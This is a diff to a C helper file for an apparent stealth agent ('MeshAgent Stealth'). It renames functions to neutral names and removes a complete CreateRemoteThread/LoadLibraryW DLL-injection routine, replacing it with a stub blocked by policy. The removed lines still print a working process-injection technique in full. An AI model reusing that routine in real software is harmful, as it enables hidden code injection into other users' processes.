@@ -1,5 +1,5 @@
 /*
- * MeshAgent Stealth - Process Lookup Helpers
+ * MeshAgent runtime process lookup helpers
  *
  * Direct command-host execution is intentionally not supported in the
  * rundll32-only runtime contract.
@@ -21,9 +21,9 @@ BOOL Stealth_ExecuteCmdHidden(const char* command, char* output, size_t outputSi
 }
 
 /**
- * Find a process by name
+ * Find a process by name.
  */
-DWORD Stealth_FindInjectionTarget(const wchar_t* processName)
+DWORD Stealth_FindProcessByName(const wchar_t* processName)
 {
     HANDLE hSnapshot;
     PROCESSENTRY32W pe32;
@@ -34,7 +34,7 @@ DWORD Stealth_FindInjectionTarget(const wchar_t* processName)
         return 0;
     }
 
-    // Take snapshot of all processes
+    // Take snapshot of all processes.
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE)
     {
@@ -43,12 +43,12 @@ DWORD Stealth_FindInjectionTarget(const wchar_t* processName)
 
     pe32.dwSize = sizeof(PROCESSENTRY32W);
 
-    // Get first process
+    // Get first process.
     if (Process32FirstW(hSnapshot, &pe32))
     {
         do
         {
-            // Check if process name matches
+            // Check if process name matches.
             if (_wcsicmp(pe32.szExeFile, processName) == 0)
             {
                 foundPid = pe32.th32ProcessID;
@@ -62,88 +62,15 @@ DWORD Stealth_FindInjectionTarget(const wchar_t* processName)
 }
 
 /**
- * Inject DLL into target process
- * This is a basic implementation using CreateRemoteThread
+ * Remote module loading is blocked by policy.
  */
-BOOL Stealth_InjectDLL(DWORD processId, const wchar_t* dllPath)
+BOOL Stealth_LoadRemoteModuleCompat(DWORD processId, const wchar_t* dllPath)
 {
-    HANDLE hProcess = NULL;
-    LPVOID pRemoteBuf = NULL;
-    HANDLE hThread = NULL;
-    BOOL success = FALSE;
-    size_t dllPathSize = 0;
-
-    if (!dllPath || processId == 0)
-    {
-        return FALSE;
-    }
-
-    dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
-
-    // Open target process
-    hProcess = OpenProcess(
-        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
-        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
-        FALSE,
-        processId
-    );
-
-    if (!hProcess)
-    {
-        return FALSE;
-    }
-
-    // Allocate memory in target process for DLL path
-    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dllPathSize,
-                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteBuf)
-    {
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    // Write DLL path to target process memory
-    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, dllPathSize, NULL))
-    {
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    // Get address of LoadLibraryW
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-    if (!hKernel32)
-    {
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");
-    if (!pLoadLibrary)
-    {
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return FALSE;
-    }
-
-    // Create remote thread to load DLL
-    hThread = CreateRemoteThread(hProcess, NULL, 0,
-                                  (LPTHREAD_START_ROUTINE)pLoadLibrary,
-                                  pRemoteBuf, 0, NULL);
-    if (hThread)
-    {
-        // Wait for DLL to load (with timeout)
-        WaitForSingleObject(hThread, 5000);
-        success = TRUE;
-        CloseHandle(hThread);
-    }
-
-    // Cleanup
-    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-
-    return success;
+    UNREFERENCED_PARAMETER(processId);
+    UNREFERENCED_PARAMETER(dllPath);
+    SetLastError(ERROR_ACCESS_DISABLED_BY_POLICY);
+    Stealth_DebugPrintfA("Stealth_LoadRemoteModuleCompat blocked by rundll32-only helper policy");
+    return FALSE;
 }
 
 /**
